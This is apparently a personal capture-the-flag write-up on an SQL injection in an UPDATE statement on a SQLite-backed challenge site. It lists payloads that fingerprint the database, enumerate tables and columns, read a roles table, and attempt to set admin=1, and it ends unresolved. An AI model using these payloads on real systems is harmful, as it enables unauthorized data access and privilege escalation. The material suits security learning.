---
created: 2024-06-09T16:20
updated: 2024-06-23T08:16
---

> I was working on this website and wanted you to check it out. The code is a bit of a mess, since it's only an extremely early version. In fact, you're the very first user, with ID 1!
> PLEASE NOTE: What you do should, in theory, not affect other solvers. Please let us know if this is not the case.

---

SQL Injection huh, and with `UPDATE`.

Make a guess for the statement.

```sql
UPDATE table SET name="<input>" WHERE id='1'
```

With some [version checking](../../sql.md)...

```sql
UPDATE table SET name=""||(SELECT sqlite_version())||"" WHERE id='1'
```

We can determine that it is sqlite.

```sql
UPDATE table SET name=""||(SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('users'))||""
```

```
" || (SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%') || "

## users,roles_e25832119caec3e7

" || (SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='roles_aa673201a75d3012') || "

## CREATE TABLE roles_aa673201a75d3012 (id INTEGER, admin INTEGER, FOREIGN KEY(id) REFERENCES users(id) ON UPDATE CASCADE).

" || (SELECT id||","||admin FROM roles_2d69a85c4fb75907 WHERE id='1') || "

## 1,0

" || (UPDATE roles_e25832119caec3e7 SET admin=1) || "


", admin="1"
```

Welp, idk
